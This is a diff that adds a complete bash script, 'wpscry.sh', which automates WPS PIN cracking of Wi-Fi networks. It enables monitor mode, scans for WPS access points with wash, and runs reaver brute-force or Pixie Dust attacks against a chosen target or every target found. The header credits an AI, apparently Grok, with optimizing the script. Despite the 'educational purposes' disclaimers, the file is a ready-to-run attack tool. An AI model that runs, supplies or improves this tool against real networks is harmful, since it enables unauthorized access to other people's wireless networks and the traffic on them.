@@ -1,0 +1,171 @@
+#!/bin/bash
+# [wpscry.sh] - Optimized Version
+#--------------------------------------------------------------------------------
+# Automated WPS Wi-Fi Cracking - For educational purposes only.
+# Author: Rofi (fixploit03) | GitHub: https://github.com/fixploit03/WPSCRY
+# Optimized by: [Grok 3 - xAI]
+#--------------------------------------------------------------------------------
+# Warning: Use only on networks you own or have explicit permission to test.
+#--------------------------------------------------------------------------------
+
+# Colors for output
+RED='\033[0;31m'
+GREEN='\033[0;32m'
+BLUE='\033[0;34m'
+NC='\033[0m' # No Color
+
+# Log file
+LOG_FILE="wpscry_$(date +%Y%m%d_%H%M%S).log"
+
+# Check root privileges
+check_root() {
+    [[ $EUID -ne 0 ]] && { echo -e "${RED}[-] This script must be run as root!${NC}"; exit 1; }
+}
+
+# Display warning
+warning() {
+    echo -e "${BLUE}#######################################################################${NC}"
+    echo -e "# ${RED}Warning${NC}                                                           #"
+    echo -e "# Usage of this script is your sole responsibility.                   #"
+    echo -e "# Designed for educational purposes. Unauthorized access is illegal!  #"
+    echo -e "${BLUE}#######################################################################${NC}"
+    echo ""
+    read -p "[#] Proceed? [Y/n]: " confirm
+    [[ "$confirm" =~ ^[Nn]$ ]] && { echo "[*] Goodbye!"; exit 0; }
+    [[ ! "$confirm" =~ ^[YyNn]$ ]] && { echo -e "${RED}[-] Invalid input!${NC}"; warning; }
+}
+
+# Check required tools
+check_tools() {
+    local tools=("reaver" "airmon-ng" "iwconfig" "iw" "pixiewps" "wash")
+    local missing=()
+    for tool in "${tools[@]}"; do
+        command -v "$tool" >/dev/null || missing+=("$tool")
+    done
+    if [[ ${#missing[@]} -gt 0 ]]; then
+        echo -e "${RED}[-] Missing tools:${NC}"
+        printf '%s\n' "${missing[@]}"
+        exit 1
+    fi
+}
+
+# Show current time
+show_time() {
+    echo -e "${BLUE}[$(date +'%A, %e %B %Y - %H:%M:%S')]${NC}"
+}
+
+# Display banner
+banner() {
+    clear
+    show_time
+    echo "╦ ╦  ╔═╗  ╔═╗  ╔═╗  ╦═╗  ╦ ╦"
+    echo "║║║  ╠═╝  ╚═╗  ║    ╠╦╝  ╚╦╝"
+    echo "╚╩╝  ╩    ╚═╝  ╚═╝  ╩╚═   ╩ "
+    echo -e "${GREEN}Optimized WPSCRY by fixploit03 & Grok${NC}"
+}
+
+# Select Wi-Fi interface using numbers
+select_interface() {
+    local interfaces=($(iw dev | grep -w 'Interface' | awk '{print $2}'))
+    [[ ${#interfaces[@]} -eq 0 ]] && { echo -e "${RED}[-] No Wi-Fi interfaces found!${NC}"; exit 1; }
+    echo "Available Wi-Fi interfaces:"
+    for i in "${!interfaces[@]}"; do
+        echo "[$((i+1))] ${interfaces[$i]}"
+    done
+    read -p "[#] Select interface number (1-${#interfaces[@]}): " choice
+    [[ ! "$choice" =~ ^[1-9][0-9]*$ || $choice -lt 1 || $choice -gt ${#interfaces[@]} ]] && { echo -e "${RED}[-] Invalid choice!${NC}"; select_interface; }
+    iwifi="${interfaces[$((choice-1))]}"
+    echo -e "${GREEN}[+] Selected: $iwifi${NC}"
+}
+
+# Enable monitor mode
+enable_monitor() {
+    airmon-ng check kill &>/dev/null
+    [[ $(iwconfig "$iwifi" 2>/dev/null | grep -w 'Mode:Monitor') ]] && { echo -e "${GREEN}[+] $iwifi is already in monitor mode${NC}"; return; }
+    echo "[*] Enabling monitor mode on $iwifi..."
+    airmon-ng start "$iwifi" &>/dev/null
+    [[ $? -eq 0 ]] && { iwifi=$(iw dev | grep -w 'Interface' | grep -w "${iwifi}mon" || echo "$iwifi"); echo -e "${GREEN}[+] Monitor mode enabled: $iwifi${NC}"; } || { echo -e "${RED}[-] Failed to enable monitor mode${NC}"; exit 1; }
+}
+
+# Scan for WPS-enabled networks
+scan_wps() {
+    echo "[*] Scanning for WPS-enabled Wi-Fi (CTRL+C to stop)..."
+    wash -i "$iwifi" -o wps_scan.txt &>/dev/null &
+    local pid=$!
+    trap "kill $pid 2>/dev/null; echo -e '\n[*] Scan stopped'; cat wps_scan.txt" SIGINT
+    wait $pid
+    trap - SIGINT
+    echo "Scan results saved to wps_scan.txt"
+    cat wps_scan.txt | tee -a "$LOG_FILE"
+}
+
+# Select target from scan results
+select_target() {
+    local targets=($(awk '/^[0-9A-Fa-f:]{17}/ {print $1","$2}' wps_scan.txt))
+    [[ ${#targets[@]} -eq 0 ]] && { echo -e "${RED}[-] No WPS targets found${NC}"; exit 1; }
+    echo "Available WPS targets:"
+    for i in "${!targets[@]}"; do
+        IFS=',' read -r bssid channel <<< "${targets[$i]}"
+        echo "[$((i+1))] BSSID: $bssid | Channel: $channel"
+    done
+    read -p "[#] Select target number (1-${#targets[@]}) or 'all': " choice
+    if [[ "$choice" == "all" ]]; then
+        target_list=("${targets[@]}")
+    else
+        [[ ! "$choice" =~ ^[1-9][0-9]*$ || $choice -lt 1 || $choice -gt ${#targets[@]} ]] && { echo -e "${RED}[-] Invalid choice${NC}"; select_target; }
+        IFS=',' read -r bssid channel <<< "${targets[$((choice-1))]}"
+        target_list=("$bssid,$channel")
+    fi
+}
+
+# Configure attack options
+configure_attack() {
+    echo "Verbose modes: [0] None, [1] Basic, [2] Detailed, [3] Very detailed"
+    read -p "[#] Select verbose mode (default 0): " mode
+    case "$mode" in
+        1) verbose="-v" ;;
+        2) verbose="-vv" ;;
+        3) verbose="-vvv" ;;
+        *) verbose="" ;;
+    esac
+    read -p "[#] Use Pixie Dust attack? [N/y]: " pixie
+    [[ "$pixie" =~ ^[Yy]$ ]] && pixie_opt="--pixie-dust" || pixie_opt=""
+}
+
+# Execute the attack
+run_attack() {
+    for target in "${target_list[@]}"; do
+        IFS=',' read -r bssid channel <<< "$target"
+        local session="session_${bssid}_$(date +%H%M%S).txt"
+        echo -e "${GREEN}[*] Attacking BSSID: $bssid | Channel: $channel${NC}"
+        reaver -i "$iwifi" -b "$bssid" -c "$channel" -s "$session" $verbose $pixie_opt | tee -a "$LOG_FILE" &
+        local pid=$!
+        wait $pid
+        [[ -f "$session" ]] && rm "$session"
+    done
+}
+
+# Cleanup
+cleanup() {
+    echo "[*] Cleaning up..."
+    airmon-ng stop "$iwifi" &>/dev/null
+    systemctl start NetworkManager 2>/dev/null
+    echo -e "${GREEN}[+] Done, log saved to $LOG_FILE${NC}"
+}
+
+# Main function
+main() {
+    check_root
+    warning
+    check_tools
+    banner
+    select_interface
+    enable_monitor
+    scan_wps
+    select_target
+    configure_attack
+    run_attack
+    cleanup
+}
+
+main
